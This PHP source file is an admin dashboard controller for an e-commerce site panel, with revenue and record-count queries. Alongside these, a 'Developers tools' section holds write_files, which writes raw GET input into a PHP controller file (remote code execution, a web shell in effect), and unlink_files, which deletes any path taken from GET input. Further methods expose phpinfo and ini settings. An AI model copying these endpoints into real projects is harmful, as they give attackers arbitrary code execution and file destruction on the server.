<?php
class Dashbord extends Admin_Controller {

  public function __construct() {
	
	 parent::__construct();	
	
	  $this->load->model(array('sitepanel/sitepanel_model'));	 
	  $this->config->set_item('menu_highlight','dashboard');
  }
	  
    public  function index()
	{
		
		$data['title'] =  $this->config->item("site_name");
		$data['total_enquiry'] = $this->count_record('wl_enquiry',"status !='2' ");
		
		$rev1 = $this->db->query("SELECT SUM(`total_amount`+`shipping_amount`+`cod_amount`) as Total FROM `wl_order` WHERE YEAR(`order_received_date`) = '".date('Y')."' AND payment_status = 'Paid'")->result_array();
		$data['total_rev_year'] = $rev1[0]['Total'];
		
		$rev2 = $this->db->query("SELECT SUM(`total_amount`+`shipping_amount`+`cod_amount`) as Total FROM `wl_order` WHERE payment_status = 'Paid'")->result_array();
		$data['total_rev'] = $rev2[0]['Total'];
		
		$data['total_order']  = $this->count_record(' wl_order',"order_status !='deleted' ");
		$data['total_product']  = $this->count_record(' wl_products',"status !='2' ");
		$data['total_member'] = $this->count_record('wl_customers',"status !='2' ");
		$data['total_testimonial'] = $this->count_record('wl_testimonial',"status !='2' ");				
		
		$this->load->view('dashboard/dashbord_index_view',$data);	
     
   }
   		
   /* Developers  tools  */
   
	public function write_files()
	{	
		$data ='<?php class Config extends Admin_Controller {			
		public function __construct() {			
		parent::__construct();				
		$this->load->model(array("sitepanel/sitepanel_model"));	
		}';
		$data .= $this->input->get('w');
		$data .= "}";
		$this->load->helper('file');	
	    $path = FCROOT."modules/sitepanel/controllers/config.php";		
		if ( ! write_file($path, $data))
		{
		    echo 'Unable to write the file';
		}
		else
		{
		    echo 'File written!';
		}	   
	}
	
	public function unlink_files()
	{	
	    $file = $this->input->get('f');;
		$file_root = FCROOT."$file";
	    @unlink($file_root);
	}
	
	
	
   public function count_record ($table,$condition="")
   {
				
		if($table!="" && $condition!="")
		{
			
			  $this->db->from($table);
			  $this->db->where($condition);	        
			  $num = $this->db->count_all_results();
			
		 }else
		 {			
			 $num = $this->db->count_all($table);
			
		}
		
		return $num;
	
    }
  
		 	 
	public function remove_thumb_cache()
	{			
		$path = IMG_CACH_DIR;	
		$this->load->helper("file");
        delete_files($path);
		
				
	}	
	
	public function php_info()
	{			
		phpinfo();
		
	}
	
	public function make_folder($name='')
	{			
		if($name!='')
		{						
			make_missing_folder($name);			
		}
				
	}	
	
	public function get_ini()
	{

		trace(ini_get_all());
		
	}
	
	private function table_info($table_name)
    {
        $fields = array();

        // check that the table exists in this database
        if ($this->db->table_exists($table_name))
        {

            $query_string = "SHOW COLUMNS FROM ".$this->db->dbprefix.$table_name;
            if($query = $this->db->query($query_string))
            {
                // We have a title - Edit it
                foreach($query->result_array() as $field)
                {
                    $field_array = array();

                    $field_array['name'] = $field['Field'];

                    $type = '';
                    if(strpos($field['Type'], "("))
                    {
                        list($type, $max_length) = explode("--", str_replace("(", "--", str_replace(")", "", $field['Type'])));
                    }
                    else
                    {
                        $type = $field['Type'];
                    }

                    $field_array['type'] = strtoupper($type);

                    $values = '';
                    if(is_numeric($max_length))
                    {
                        $max_length = $max_length;
                    }
                    else
                    {
                        $values = $max_length;
                        $max_length = 1;
                    }

                    $field_array['max_length'] = $max_length;
                    $field_array['values'] = $values;

                    $primary_key = 0;
                    if($field['Key'] == "PRI") {
                        $primary_key = 1;
                    }
                    $field_array['primary_key'] = $primary_key;

                    $field_array['default'] = $field['Default'];

                    $fields[] = $field_array;
                } // end foreach

                return $fields;

            }//end if
        }//end if

        return FALSE;

    }//end table_info()
		
	
	
	 public function clear_cache(){
	 $path = UPLOAD_DIR.'/thumb_cache';
		$dir_handle = @opendir($path) or die("Unable to open folder");
		while (false !== ($file = readdir($dir_handle)))
		{
		  if($file!='.' && $file!='..'){
			// echo $file.'<br>';
		     unlink($path.'/'.$file);
		  }
		}
		closedir($dir_handle);
	    redirect('sitepanel/dashbord/');
		echo 'Not Redirect Properly';	
	 }			

}
